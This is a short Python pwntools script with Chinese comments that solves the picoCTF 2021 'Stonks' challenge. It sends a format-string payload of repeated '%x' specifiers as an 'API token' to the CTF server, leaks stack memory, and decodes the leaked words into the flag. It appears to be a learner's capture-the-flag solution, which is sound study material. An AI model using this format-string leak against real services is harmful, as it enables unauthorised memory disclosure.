#大神：https://ithelp.ithome.com.tw/articles/10281425
# https://www.c0dedead.io/picoctf-2021-stonks/
#pwntools: 我們用這個工具來接收/送出遠端連線的東西

#不要用pwn.py做檔名，會import錯
from pwn import *

#連接到指定port
r = remote('mercury.picoctf.net', 59616)
print(r.recvuntil(b'2) View my portfolio\n').decode())
# print(r.recvuntil(u'2) View my portfolio\n')) 
# 以上會跑出: BytesWarning: Text is not bytes; assuming ASCII, no guarantees.

#送出訊息，相當於程式執行時按下1
r.sendline(b'1')
print(r.recvuntil(b'What is your API token?\n').decode())

#送出16進位
r.sendline(b'%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x')
print(r.recvline().decode())
s = r.recvline().decode()
l = s.split('-')

flag = b''
for u in l:
    print(u)
for u in l:
    u = int(u, base=16)
    flag += pack(u, 32, 'little')
print(flag)

r.close()